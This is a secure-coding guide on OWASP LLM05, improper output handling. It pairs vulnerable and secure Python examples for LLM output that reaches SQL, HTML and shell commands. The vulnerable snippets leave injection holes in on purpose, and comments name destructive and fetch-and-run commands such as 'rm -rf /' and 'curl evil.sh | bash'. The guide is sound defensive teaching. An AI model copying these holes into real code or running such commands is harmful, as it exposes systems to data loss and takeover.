---
title: LLM05 - Prevent Improper Output Handling
impact: CRITICAL
impactDescription: LLM outputs used directly in downstream systems can lead to XSS, SQL injection, command injection, and SSRF
tags: security, llm, output-handling, owasp-llm05
attribution: Curated and enhanced for Prismor
---

## LLM05: Prevent Improper Output Handling

LLM outputs must be treated as untrusted user input when used in downstream systems. An LLM can be manipulated (via prompt injection) to output malicious SQL, JavaScript, shell commands, or URLs that are then executed or rendered by the application.

**Attack vectors:** LLM-generated SQL executed without parameterization, LLM-generated HTML rendered without escaping, LLM-generated shell commands run directly, LLM-generated URLs fetched without validation.

---

### LLM Output in Database Queries

**Vulnerable (executing LLM-generated SQL directly):**

```python
def natural_language_query(nl_query: str) -> list:
    llm_response = openai.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": "Convert natural language to SQL for our users table."},
            {"role": "user", "content": nl_query}
        ]
    )
    sql = llm_response.choices[0].message.content

    # VULNERABLE: LLM could output "DROP TABLE users;" or exfiltration queries
    result = db.execute(sql)
    return result
```

**Secure (constrained queries with parameterization — never execute raw LLM SQL):**

```python
def natural_language_query(nl_query: str) -> list:
    # Instead of asking the LLM for SQL, ask it to extract structured intent
    llm_response = openai.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": """Extract query intent as JSON.
            Only extract: {"filter_by": "name|email|status", "value": "<string>", "limit": <int>}
            Never output SQL. Never output more than these fields."""},
            {"role": "user", "content": nl_query}
        ],
        response_format={"type": "json_object"}
    )

    intent = json.loads(llm_response.choices[0].message.content)

    # Validate intent fields strictly
    allowed_filters = {"name", "email", "status"}
    if intent.get("filter_by") not in allowed_filters:
        raise ValueError("Invalid filter field")

    limit = min(int(intent.get("limit", 10)), 100)  # Cap limit

    # Use parameterized query — never interpolate LLM output into SQL
    result = db.execute(
        "SELECT id, name, email FROM users WHERE %s = %%s LIMIT %%s" % intent["filter_by"],
        [intent["value"], limit]
    )
    return result
```

---

### LLM Output Rendered as HTML

**Vulnerable (rendering LLM output as raw HTML):**

```python
@app.route("/generate-report")
def generate_report():
    user_topic = request.args.get("topic")
    llm_output = get_llm_response(f"Write a report on: {user_topic}")

    # VULNERABLE: if LLM is injected, it can output <script>...</script>
    return render_template_string(f"<div>{llm_output}</div>")
```

**Secure (escape LLM output before rendering):**

```python
from markupsafe import escape

@app.route("/generate-report")
def generate_report():
    user_topic = request.args.get("topic")
    llm_output = get_llm_response(f"Write a report on: {user_topic}")

    # Safe: escape HTML entities in LLM output
    safe_output = escape(llm_output)
    return render_template_string(f"<div>{safe_output}</div>")
```

Or if Markdown-to-HTML rendering is needed:

```python
import bleach
import markdown

ALLOWED_TAGS = ['p', 'h1', 'h2', 'h3', 'ul', 'ol', 'li', 'strong', 'em', 'code', 'pre']
ALLOWED_ATTRS = {}

def render_safe_markdown(llm_markdown: str) -> str:
    raw_html = markdown.markdown(llm_markdown)
    # Sanitize — strip any tags not in allowlist (including <script>)
    return bleach.clean(raw_html, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)
```

---

### LLM Output Used in Shell Commands

**Vulnerable (running LLM-suggested shell command):**

```python
def run_suggested_command(user_request: str):
    llm_response = get_llm_response(f"What shell command does: {user_request}")
    command = llm_response.strip()

    # VULNERABLE: rm -rf /, curl evil.sh | bash, etc.
    subprocess.run(command, shell=True)
```

**Secure (never execute LLM-generated shell commands; use structured action mapping):**

```python
ALLOWED_ACTIONS = {
    "list_files": lambda: subprocess.run(["ls", "-la"], capture_output=True),
    "show_disk_usage": lambda: subprocess.run(["df", "-h"], capture_output=True),
    "count_processes": lambda: subprocess.run(["ps", "aux"], capture_output=True),
}

def run_suggested_command(user_request: str):
    llm_response = openai.chat.completions.create(
        model="gpt-4",
        messages=[
            {"role": "system", "content": f"""
            Map the user's request to exactly one of these action names: {list(ALLOWED_ACTIONS.keys())}
            Output only the action name. If no action matches, output 'none'.
            """},
            {"role": "user", "content": user_request}
        ]
    )
    action_name = llm_response.choices[0].message.content.strip().lower()

    if action_name not in ALLOWED_ACTIONS:
        return "Action not permitted."

    return ALLOWED_ACTIONS[action_name]()
```

---

## Key Prevention Rules

1. **Treat LLM output as untrusted** — apply the same trust level as user-supplied input
2. **Never execute LLM-generated SQL** — extract intent and use parameterized queries
3. **Escape LLM output before HTML rendering** — use framework escaping or a sanitization library
4. **Never pass LLM output to shell** — use structured action maps with hardcoded commands
5. **Validate LLM output schema** — use `response_format: json_object` and validate the JSON before acting on it
6. **Log all downstream actions** — maintain an audit trail when LLM output drives action

**References:**
- [OWASP LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm05-improper-output-handling/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Prismor](https://github.com/PrismorSec/prismor)
